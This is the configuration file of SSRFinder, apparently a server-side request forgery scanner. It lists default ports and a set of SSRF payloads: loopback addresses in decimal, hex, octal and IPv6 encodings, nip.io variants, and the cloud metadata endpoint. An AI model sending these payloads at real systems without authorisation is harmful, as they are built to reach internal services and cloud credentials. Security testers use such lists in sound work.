#!/usr/bin/env python3
"""
Configuration and constants for SSRFinder
"""

VERSION = "0.2.5 Beta"
INJECTION_MARKERS = ["SSRF", "***"]
SUPPORTED_METHODS = ["GET", "POST"]

# Default ports for scanning
DEFAULT_PORTS = [80, 443, 8080, 8443, 3000, 5000, 8000, 9000]

# Default payloads
DEFAULT_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://169.254.169.254",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "http://[0000::1]",
    "http://[::ffff:127.0.0.1]",
    "http://127.1",
    "http://2130706433",
    "http://0x7f000001",
    "http://017700000001",
    "http://127.0.0.1.nip.io",
    "http://169.254.169.254.nip.io",
]
